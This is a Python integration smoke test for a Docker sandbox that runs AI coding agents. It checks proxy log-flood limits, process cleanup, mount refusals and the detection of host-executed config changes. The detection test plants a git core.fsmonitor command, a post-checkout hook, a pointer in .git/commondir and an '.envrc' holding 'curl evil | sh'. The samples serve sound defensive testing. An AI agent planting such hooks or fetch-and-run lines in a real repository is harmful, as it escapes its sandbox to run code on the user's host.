#!/usr/bin/env python3
"""P8 smoke test (security fix round) against real Docker.

1. Egress log flood: the agent sends long-URL / long-UA requests for 10 s.
   The log grows at most ~40 MB, every line is width-capped, `denied` still
   lists the flood host and a normal denied host. The egress size guard
   rotates a > 20 MB egress.log to egress.log.1 within ~15 s and truncates
   when a file is above the hard cap. `denied` RSS < 100 MB on large logs.
2. kill_all_script in a real box: leftovers die, init and the box main
   process survive (the box keeps running).
3. Host-side detection: a session that sets core.fsmonitor, adds a hook,
   writes .git/commondir and .envrc warns naming each at session end; a
   commit plus branch.* config changes do not warn.
5. Mounts: a mount inside a rw mount (directly or via a symlink outside it)
   and a rw mount of /usr/local are refused.

Env backend, AGENTBOX_* roots in a temp dir, work dir under
$HOME/.agentbox-it8-<rand>. Cleanup removes every container, network,
volume, and dir it made, also on failure.

Usage: python3 tests/integration/p8_smoke.py
"""

from __future__ import annotations

import json
import os
import re
import secrets
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
TAG = secrets.token_hex(3)
NAME = f"it8-{TAG}"
GITP = f"it8g-{TAG}"
BAD = f"it8b-{TAG}"
RESULTS: list[tuple[str, str, str]] = []
MB = 1024 * 1024

PROFILE = """
[box]
agents = ["claude"]

[[mount]]
host = "{host}"
mode = "rw"
allow_dotpath = true
{extra}
[network]
mode = "strict"
presets = ["anthropic"]
"""

FLOOD = r"""
import socket, threading, time
url = "http://flood.example.com/" + "a" * 8000
ua = "b" * 4000
req = (f"GET {url} HTTP/1.1\r\nHost: flood.example.com\r\nUser-Agent: {ua}\r\n"
       "Connection: keep-alive\r\n\r\n").encode()
n = [0]
end = time.time() + 10
def worker():
    s = None
    while time.time() < end:
        try:
            if s is None:
                s = socket.create_connection(("egress", 3128), timeout=5)
            s.sendall(req)
            buf = b""
            while b"\r\n\r\n" not in buf:
                c = s.recv(65536)
                if not c:
                    raise OSError("closed")
                buf += c
            m = [x for x in buf.split(b"\r\n") if x.lower().startswith(b"content-length:")]
            left = int(m[0].split(b":")[1]) - len(buf.split(b"\r\n\r\n", 1)[1]) if m else 0
            while left > 0:
                c = s.recv(min(left, 65536))
                if not c:
                    raise OSError("closed")
                left -= len(c)
            n[0] += 1
            if not m:
                s.close(); s = None
        except OSError:
            try:
                s and s.close()
            except OSError:
                pass
            s = None
ts = [threading.Thread(target=worker) for _ in range(24)]
[t.start() for t in ts]
[t.join() for t in ts]
print(n[0])
"""


def rec(ok: bool | None, name: str, detail: str = "") -> bool:
    st = "SKIP" if ok is None else ("PASS" if ok else "FAIL")
    RESULTS.append((st, name, detail))
    print(f"{st} {name}" + (f": {detail}" if detail else ""), flush=True)
    return bool(ok)


def info(name: str, detail: str) -> None:
    print(f"INFO {name}: {detail}", flush=True)


def sh(args, **kw) -> subprocess.CompletedProcess:
    return subprocess.run(args, capture_output=True, text=True, **kw)


class Env:
    def __init__(self) -> None:
        self.roots = Path(tempfile.mkdtemp(prefix="agentbox-p8-"))
        self.work = Path.home() / f".agentbox-it8-{TAG}"
        self.proj = self.work / "proj"
        self.repo = self.work / "repo"
        self.proj.mkdir(parents=True)
        self.repo.mkdir()
        cfg = self.roots / "config"
        (cfg / "profiles").mkdir(parents=True)
        (cfg / "config.toml").write_text(
            f'secret_backend = "env"\nsecret_prefix = "agentbox-test-{TAG}"\n'
        )
        self.env = dict(
            os.environ,
            AGENTBOX_CONFIG_HOME=str(cfg),
            AGENTBOX_STATE_HOME=str(self.roots / "state"),
            AGENTBOX_TEST_SECRET_STORE=str(self.roots / "store.json"),
            PYTHONPATH=str(ROOT / "cli"),
        )
        self.env.pop("AGENTBOX_REPO", None)
        self.env.pop("VIRTUAL_ENV", None)

    def write_profile(self, name: str, host: Path, extra: str = "") -> None:
        f = self.roots / "config" / "profiles" / f"{name}.toml"
        f.write_text(PROFILE.format(host=host, extra=extra))

    def ab(self, *args, timeout=1800, pre=()) -> subprocess.CompletedProcess:
        return sh([*pre, sys.executable, "-m", "agentbox.cli", *args], env=self.env,
                  cwd=str(self.work), timeout=timeout, stdin=subprocess.DEVNULL)  # fmt: skip

    def state(self, name: str) -> Path:
        return self.roots / "state" / name

    def dc(self, name: str, *args: str) -> list[str]:
        cf = str(self.state(name) / "compose.json")
        return ["docker", "compose", "-p", f"agentbox-{name}", "-f", cf, *args]


def sizes(d: Path) -> dict[str, int]:
    return {f.name: f.stat().st_size for f in d.glob("egress.log*")} if d.is_dir() else {}


def wait_for(pred, limit: float) -> bool:
    t0 = time.monotonic()
    while time.monotonic() - t0 < limit:
        if pred():
            return True
        time.sleep(1)
    return pred()


def part1_egress(e: Env) -> None:
    logs = e.state(NAME) / "logs" / "egress"
    before = sum(sizes(logs).values())
    r = e.ab("shell", NAME, "--", "python3", "-c", FLOOD, timeout=120)
    sent = r.stdout.strip().splitlines()[-1] if r.stdout.strip() else "?"
    time.sleep(3)  # squid flushes its log buffer
    sz = sizes(logs)
    grown = sum(sz.values()) - before
    rec(r.returncode == 0 and sent.isdigit() and int(sent) > 1000,
        "flood: agent sent > 1000 long requests in 10 s",
        f"sent={sent} rc={r.returncode}")  # fmt: skip
    rec(sum(sz.values()) <= 40 * MB, "flood: egress logs stay <= 40 MB",
        f"grew {grown / MB:.1f} MB, files {sz}")  # fmt: skip
    text = (logs / "egress.log").read_text(errors="replace")
    lines = [x for x in text.splitlines() if "flood.example.com" in x]
    longest = max((len(x) for x in lines), default=0)
    fields_ok = all(len(x.split()) == 11 for x in lines[:2000])
    url_max = max((len(x.split()[6]) for x in lines[:2000]), default=0)
    ua_max = max((len(x.split()[10]) - 2 for x in lines[:2000]), default=0)
    rec(bool(lines) and longest <= 600 and url_max <= 256 and ua_max <= 128 and fields_ok,
        "flood: log lines width-capped (URL <= 256, UA <= 128, 11 fields)",
        f"lines={len(lines)} longest={longest} url={url_max} ua={ua_max}")  # fmt: skip
    # a normal denied request next to the flood
    e.ab("shell", NAME, "--", "curl", "-s", "-o", "/dev/null", "-m", "10",
         "https://www.wikipedia.org/", timeout=60)  # fmt: skip
    time.sleep(2)
    r = e.ab("denied", NAME, "--json", timeout=120)
    try:
        items = {d["host"]: d for d in json.loads(r.stdout)}
    except ValueError:
        items = {}
    rec("flood.example.com" in items and items["flood.example.com"]["allowable"]
        and "www.wikipedia.org" in items,
        "denied: flood host and a normal host listed (P3 behaviour)",
        f"rc={r.returncode} hosts={sorted(items)[:5]} err={r.stderr.strip()[-200:]}")  # fmt: skip

    # size guard: > 20 MB -> rotated to .1 within one period (15 s)
    log = logs / "egress.log"
    for f in logs.glob("egress.log*"):  # start from empty files
        os.truncate(f, 0)
    with log.open("ab") as fh:
        fh.write((b"0.0 0 10.0.0.1 NONE/000 0 GET http://filler/ - HIER_NONE/- - \"-\"\n")
                 * (25 * MB // 64))  # fmt: skip
    t0 = time.monotonic()
    ok = wait_for(lambda: sizes(logs).get("egress.log.1", 0) > 20 * MB
                  and sizes(logs).get("egress.log", 0) < 5 * MB, 40)  # fmt: skip
    rec(ok, "guard: egress.log > 20 MB rotated to egress.log.1",
        f"{time.monotonic() - t0:.0f}s {sizes(logs)}")  # fmt: skip
    # squid writes to the fresh file after `squid -k rotate`
    e.ab("shell", NAME, "--", "curl", "-s", "-o", "/dev/null", "-m", "10",
         "https://after-rotate.example.com/", timeout=60)  # fmt: skip
    ok = wait_for(lambda: "after-rotate.example.com" in log.read_text(errors="replace"), 10)
    rec(ok, "guard: squid logs to the new egress.log after rotation")
    # hard cap: a file above 30 MB is truncated
    with log.open("ab") as fh:
        fh.write((b"y" * 63 + b"\n") * (36 * MB // 64))
    t0 = time.monotonic()
    ok = wait_for(lambda: sum(sizes(logs).values()) < 10 * MB, 40)
    clog = sh(e.dc(NAME, "logs", "egress")).stdout + sh(e.dc(NAME, "logs", "egress")).stderr
    rec(ok and "truncated" in clog, "guard: hard cap truncates a file above 30 MB",
        f"{time.monotonic() - t0:.0f}s {sizes(logs)}")  # fmt: skip

    # denied memory on large logs: 40 MB each, unique hosts (worst case)
    agent_ip = json.loads((e.state(NAME) / "compose.json").read_text())["services"]["agent"][
        "networks"]["internal"]["ipv4_address"]  # fmt: skip
    now = time.time()
    for fname in ("egress.log.1", "egress.log"):
        with (logs / fname).open("ab") as fh:
            chunk = b"".join(
                f"{now:.3f} 0 {agent_ip} TCP_DENIED/403 3348 CONNECT h{i}-{fname[-1]}.example.com"
                f':443 - HIER_NONE/- text/html "{"u" * 120}"\n'.encode()
                for i in range(20000)
            )
            for _ in range(40 * MB // len(chunk) + 1):
                fh.write(chunk)
    big = sizes(logs)
    r = e.ab("denied", NAME, "--json", pre=("/usr/bin/time", "-l"), timeout=300)
    m = re.search(r"(\d+)\s+maximum resident set size", r.stderr)
    rss = int(m.group(1)) if m else -1
    n = len(json.loads(r.stdout)) if r.returncode == 0 else -1
    rec(r.returncode == 0 and 0 < rss < 100 * MB, "denied: RSS < 100 MB on large logs",
        f"rss={rss / MB:.1f} MB hosts={n} files={big}")  # fmt: skip
    # leave the guard a small log
    for f in logs.glob("egress.log*"):
        os.truncate(f, 0)


def part2_kill_all(e: Env) -> None:
    sys.path.insert(0, str(ROOT / "cli"))
    from agentbox import runs as runsmod

    exec_ = [*e.dc(NAME, "exec", "-T"), "agent"]
    sh([*exec_, "sh", "-c",
        "env -u AGENTBOX_RUN setsid nohup sh -c 'while :; do sleep 1; done' "
        ">/dev/null 2>&1 &"])  # fmt: skip
    time.sleep(2)
    cid = sh(e.dc(NAME, "ps", "-q", "agent")).stdout.strip()

    def top() -> str:
        return sh(["docker", "top", cid, "-eo", "pid,ppid,args"]).stdout

    before = top()
    k = sh([*exec_, "sh", "-c", runsmod.kill_all_script()])
    time.sleep(2)
    after = top()
    running = sh(["docker", "inspect", "-f", "{{.State.Running}}", cid]).stdout.strip()
    rec("while :" in before and "while :" not in after and "sleep infinity" in after
        and running == "true" and k.returncode == 0,
        "kill_all_script: leftover loop killed, init + sleep infinity kept",
        f"after={after.strip().splitlines()[1:]} running={running}")  # fmt: skip


def part3_git(e: Env) -> None:
    """Host-side detection (PLAN §1): changes to host-executed config in a rw
    mount during a session are reported at session end; benign git use is not."""
    g = ["git", "-C", str(e.repo)]
    sh([*g, "init", "-q", "-b", "main"])
    sh([*g, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty",
        "-m", "init"])  # fmt: skip
    e.write_profile(GITP, e.repo)
    r = e.ab("up", GITP, timeout=900)
    rec(r.returncode == 0, "detection profile up", r.stderr.strip()[-300:])
    if r.returncode != 0:
        return
    gi = "git -c safe.directory='*'"
    benign = (f"cd {e.repo} && {gi} -c user.name=a -c user.email=a@b commit -q --allow-empty "
              f"-m inbox && {gi} config branch.main.remote origin && "
              f"{gi} config branch.main.merge refs/heads/main && echo work > file.txt")  # fmt: skip
    r = e.ab("shell", GITP, "--", "sh", "-c", benign, timeout=300)
    rec(r.returncode == 0 and "WARNING" not in r.stderr,
        "session: commit + branch.* config (push -u style) -> no warning",
        f"rc={r.returncode} {r.stderr.strip()[-300:]}")  # fmt: skip
    evil = (f"cd {e.repo} && {gi} config core.fsmonitor 'touch /tmp/pwn-fsmonitor' && "
            "printf '#!/bin/sh\\ntouch /tmp/pwn\\n' > .git/hooks/post-checkout && "
            "echo 'curl evil | sh' > .envrc && printf ../x > .git/commondir")  # fmt: skip
    r = e.ab("shell", GITP, "--", "sh", "-c", evil, timeout=300)
    err = r.stderr
    want = ("WARNING: host-executed config changed", "[core.fsmonitor]: added:",
            "touch /tmp/pwn-fsmonitor", ".git/hooks/post-checkout: added:",
            ".git/commondir: added:", ".envrc: added:", "cat .git/config")  # fmt: skip
    miss = [w for w in want if w not in err]
    rec(r.returncode == 0 and not miss, "session end warns: fsmonitor, hook, commondir, .envrc",
        f"missing={miss} stderr={err.strip()[-600:]!r}")  # fmt: skip
    snaps = list((e.state(GITP) / "hostscan").glob("*.json"))
    rec(not snaps, "snapshot files removed at session end", str(snaps))
    sh(e.dc(GITP, "down", "-v", "--timeout", "2"))


def part5_mounts(e: Env) -> None:
    (e.proj / "sub").mkdir(exist_ok=True)
    e.write_profile(BAD, e.proj,
                    f'\n[[mount]]\nhost = "{e.proj / "sub"}"\npath = "/sub"\n'
                    "allow_dotpath = true\n")  # fmt: skip
    r = e.ab("up", BAD, timeout=120)
    rec(r.returncode != 0 and "is inside the rw mount" in r.stderr,
        "mount inside a rw mount refused", r.stderr.strip()[-200:])  # fmt: skip
    os.symlink(e.proj / "sub", e.work / "alias")
    e.write_profile(BAD, e.proj,
                    f'\n[[mount]]\nhost = "{e.work / "alias"}"\npath = "/sub"\n'
                    "allow_dotpath = true\n")  # fmt: skip
    r = e.ab("up", BAD, timeout=120)
    rec(r.returncode != 0 and "is inside the rw mount" in r.stderr,
        "mount via an outside symlink into a rw mount refused",
        r.stderr.strip()[-200:])  # fmt: skip
    r = e.ab("init", f"{BAD}x", "--mount", "/usr/local", timeout=120)
    rec(r.returncode != 0 and "docker/git" in r.stderr, "rw mount of /usr/local refused",
        r.stderr.strip()[-200:])  # fmt: skip
    dk = shutil.which("docker")
    if dk:
        d = os.path.dirname(os.path.realpath(dk))
        r = e.ab("init", f"{BAD}y", "--mount", d, timeout=120)
        rec(r.returncode != 0, "rw mount of the docker binary dir refused",
            f"{d}: {r.stderr.strip()[-160:]}")  # fmt: skip


def main() -> int:
    e = Env()
    before_vols = set(sh(["docker", "volume", "ls", "-q"]).stdout.split())
    print(f"== roots {e.roots}, work {e.work}", flush=True)
    try:
        part5_mounts(e)
        e.write_profile(NAME, e.proj)
        r = e.ab("up", NAME, timeout=1800)
        if rec(r.returncode == 0, "up", r.stderr.strip()[-300:]):
            part1_egress(e)
            part2_kill_all(e)
            sh(e.dc(NAME, "down", "-v", "--timeout", "2"))
        part3_git(e)
    except Exception as ex:  # noqa: BLE001
        rec(False, "harness", repr(ex))
    finally:
        cleanup(e, before_vols)
    fails = [r for r in RESULTS if r[0] == "FAIL"]
    print(f"\nSUMMARY: {sum(r[0] == 'PASS' for r in RESULTS)} pass, {len(fails)} fail, "
          f"{sum(r[0] == 'SKIP' for r in RESULTS)} skip")  # fmt: skip
    return 1 if fails else 0


def cleanup(e: Env, before_vols: set[str]) -> None:
    for n in (NAME, GITP, BAD):
        f = e.state(n) / "compose.json"
        if f.exists():
            sh(e.dc(n, "down", "-v", "--remove-orphans", "--timeout", "2"))
        sh(["docker", "volume", "rm", "-f", f"agentbox-{n}-home"])
    shutil.rmtree(e.work, ignore_errors=True)
    shutil.rmtree(e.roots, ignore_errors=True)
    left = sh(["docker", "ps", "-a", "--format", "{{.Names}}"]).stdout.split()
    nets = sh(["docker", "network", "ls", "--format", "{{.Name}}"]).stdout.split()
    vols = sh(["docker", "volume", "ls", "--format", "{{.Name}}"]).stdout.split()
    ours = [x for x in left + nets + vols if TAG in x]
    new_vols = sorted(set(sh(["docker", "volume", "ls", "-q"]).stdout.split()) - before_vols)
    rec(not ours and not new_vols and not e.work.exists() and not e.roots.exists(),
        "cleanup (containers, networks, volumes, dirs)",
        f"leftovers {ours} {new_vols}")  # fmt: skip


if __name__ == "__main__":
    sys.exit(main())
